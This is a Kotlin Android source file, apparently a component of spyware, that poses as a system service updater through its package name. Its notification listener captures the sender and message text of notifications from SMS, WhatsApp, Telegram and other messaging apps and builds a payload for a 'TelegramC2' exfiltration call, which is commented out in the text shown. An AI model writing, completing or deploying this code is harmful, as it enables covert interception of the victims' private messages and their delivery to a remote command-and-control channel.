
package com.android.systemservice.updater

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class NotifListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        val pkg = sbn.packageName ?: return
        if (!pkg.contains("messaging") && !pkg.contains("sms")
            && !pkg.contains("mms") && !pkg.contains("whatsapp")
            && !pkg.contains("telegram")) return

        val extras = sbn.notification?.extras ?: return
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        val text  = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        val whenTs = sbn.postTime

        val payload = "NOTIF: $pkg\nFrom: $title\nText: $text\nTime: $whenTs"
        try {
            // TelegramC2.send(applicationContext, payload)
        } catch (_: Throwable) {}
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
}
